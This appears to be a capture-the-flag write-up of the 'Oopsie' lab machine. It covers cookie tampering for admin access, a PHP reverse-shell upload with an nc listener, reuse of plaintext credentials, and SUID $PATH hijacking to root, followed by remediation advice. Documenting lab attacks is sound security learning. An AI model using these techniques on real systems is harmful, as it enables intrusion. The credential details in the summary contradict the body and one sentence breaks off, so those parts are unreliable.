# Oopsie | Machine | Very Easy | Linux

## Introduction
Let's start with reconnaissance.

```
nmap <IP> -sC -sV
```

Ports 80 (http) & 22 (ssh) are open. Starting with SSH is out of the question because I don't have any lead as to what the password could be.

So I tried visiting the website, & honestly there was nothing special.

## Web Proxying, Burp Suite, and Web Crawlers
A web proxy is an intermediary server that sits between you and the internet. Your request goes to the proxy first, which fetches the page from the destination server and returns it to you, effectively hiding your identity (IP address for example) from that server

Burp Suite is the industry-standard platform used for web app security testing. It is essentially an interception proxy sitting between our web browser & the web server, allowing us to view, analyze & modify HTTP/S traffic in real time.

A Web Crawler is a program or automated script that browses the web methodically.

- Burp Suite uses port 8080 by default for its proxy listener.

After disabling the interception of Burp & configuring the proxy of our browser to 127.0.0.1 on port 8080. I refreshed the page which mapped multiple directories in Burp. The most interesting one was `/cdn-cgi/login` which took me to a login page. I tried some common credentials, none of them worked, but luckily there was a "Login as guest" option which honestly was the only way forward

After logging in, I was presented with a dashboard and multible tabs, I started navigating through the website, and I came across an uploads section. Unfortunately, the upload function was blocked for me and required super admin right.


## Cookie Manipulation
A cookie is a text file with data created by the web server & stored by the browser on your computer to identify a session.

I noticed on top, the search bar had "user_id=2". So I did what any sensible human being would do, changed it to 1! and suddenly details of an admin account were presented to me instead of my normal guest credentials, the details being the role (admin) and user id (34322). Afterwards I inspected the page, went to the storage section, and then the cookies sub-section, and edited the role to be admin, and the user id to 34322 and just like that the upload functoin which was only 


## Foothold
Now for the foothold, I tried uploading a PHP reverse shell.
After uploading, the next step would be to locate the directory holding our shell and calling for it. The most logical guess was /uploads/ (which was eventually proven correct) but I decided to do it the professional way using gobuster, and sure enough, the result was /uploads
I started my listener `nc -lvnp 1234` & immediately requested my shell `http://<ip>/uploads/php-reverse-shell.php` & it worked.


## Lateral Movement
I upgraded the shell via `python3 -c "import pty; pty.spawn('/bin/bash')"`.
Now it was time for lateral movement since I can't do anything as `www-data`.

I started enumerating the directories & found `/var/www/html/cdn-cgi/login`, which reminded me of the login page, & decided to look for passwords used.

`cat * | grep -i passw` 
`cat*`: reads all files 
`|`: pipes/feeds the output to `grep` 
`grep`: searches for a specific pattern in files and prints the output
`passw*`: spassw is what we want grep to look for and * means any word after passw is fine
`i`: ignores case-sensitives like `P`assword for example


I got a password, `MEGAC0RP-4dmln!!`.
I checked available users with `cat /etc/passwd` & "robert" seemed like a good candidate.
I tried `su robert`, but unfortunately the password didn't work.

So I kept reading around & found in the `db.php` file a password "M3g4C0rpUs3r" which worked, I immediately used ls to list the contents as `robert` and found user.txt, and just liked that I found the user flag.


## Privilege Escalation
Now to gain even more privilegs, we first need to know what we're allowed to do so I used `sudo -l` and it said I wasn't allowed to run sudo as robert. And used `id` and found something intersting, whihc was that robert belonged to a group called `1001(bugtracker`

So I used ```find / -group bugtracker 2>/dev/null```
`find`: finds
`/`: tells find to search the entire file system starting from root
`-group bugtracker`: returns only files belonging to this group
`2>/dev/null`: redirects errors to a black hole so that the output looks clean

the result was a file called /usr/bin/bugtracker


I next used `ls -la /usr/bin/bugtracker` & `file /usr/bin/bugtracer` to check privileges & type of file.


SUID (Set owner User ID) is a special permission on a file. A file with SUID always executes as the OWNER of the file, regardless of who executes the command.

`s` (lowercase) = file owner has execute permission (SUID set & executable)
`S` (uppercase) = SUID set but NOT executable

The file I found has setuid and the owner is root :D.



I ran the app `/usr/bin/bugtracker`.
The tool tries to output a file using `cat` & if it doesn't find an output, it shows an error. 
In the error, we can dedeuce that the tool is trying to execute cat without using the full path /bin/cat, instead, it relies on the $PATH variable to locate the file so basically:

```cat file```
will search PATH not hard coded /bin/cat

So what will happen if we create a "malicious" cat? Only one way to find out.
```
cd /tmp          --accessing the tmp directory
echo "/bin/bash" > cat                 --creating the fake cat with /bin/bash inside
chmod +x cat                         --making it executable
export PATH=/tmp:$PATH               -- preappending tmp to PATH so it is the first directory searched when $PATH is called
```
Now bugtracker calls cat, it searches /tmp first, finds our malicious cat and viola.
You might ask, why didn't we we create the malicious cat in /bin? I mean thats where the original exists isn't it? The answer is simply `privileges`. We cannot write to /bin, we can only read.

So what happened next is we (unprivilged) executed ./bugtracker. --> bugtracker runs as root --> calls cat file --> searches $PATH which has /tmp: $PATH. --> finds our cat --> executes as root and we get a root shell!!

Finally, as root, I browsed around the files for a bit and was able to locate the root flag!

### Summary of the full chain
1. Full port scan (`nmap -sC -sV`) → found ports 80 (http) & 22 (ssh) open
2. Set up Burp Suite as an intercepting proxy to map hidden directories, discovered `/cdn-cgi/login`
3. Found and manipulated the "role"/user_id cookie value to gain admin access to the dashboard
4. Located an upload feature and uploaded a PHP reverse shell to get a `www-data` shell
5. Upgraded the shell with `python3 -c "import pty; pty.spawn('/bin/bash')"`
6. Enumerated the web root and found credentials (`MEGACORP-4dm!n[all]`) inside bugtracker application files
7. Used the found credentials to switch to the user `robert` and grab the user flag
8. Found `/usr/bin/bugtracker` with the SUID bit set, owned by root
9. Discovered the binary calls `cat` without an absolute path, relying on `$PATH`
10. Hijacked `$PATH` by placing a malicious `cat` (spawning `/bin/bash`) in `/tmp` and prepending it to `$PATH`
11. Ran `bugtracker`, which executed the malicious `cat` as root → obtained a root shell and captured the root flag

## Remediation
- Never trust client side values (cookies, hidden form fields) for authorization decisions  always validate role/permissions from the server side.
- Enforce strict file type, extension, and content validation on upload features to prevent malicious file uploading (e.g. PHP webshell) uploads.
- Store credentials securely (in a secrets manager for example), never in plaintext files reachable through the web root.
- Never grant SUID permissions to binaries that call other executables without specifying an absolute path — always hardcode paths (e.g. `/bin/cat`) or explicitly sanitize `$PATH` within the program.
- Regularly audit SUID/SGID binaries on the system (`find / -perm -4000`) and remove unnecessary SUID bits.

## What I Learned
- Client-side data (cookies, hidden parameters like user_id) can never be trusted for authorization, always make sure role/permission enforcement happens server-side, since anything sent to the browser can be edited before it comes back
- Burp Suite is essential for mapping an application's real attack surface. Features and directories that aren't visible through normal browsing (like /cdn-cgi/login) can surface once traffic is intercepted and inspected.
- Upload functionality is a common foothold vector, if file type/extension isn't strictly validated server-side, a webshell can be uploaded and executed directly.
- After landing a shell, it's worth treating web root files (config files, DB connection files, etc.) as a first place to search for hardcoded credentials, plaintext secrets in source code are a very common lateral movement path.
- Enumerating group memberships (id) can reveal privilege escalation paths that aren't obvious from sudo -l alone
- SUID binaries are only as safe as the code behind them. A SUID root binary that calls another program without specifying its absolute path is vulnerable to $PATH hijacking, since the shell will search user-writable directories (like /tmp) before trusted system ones if $PATH is manipulated.
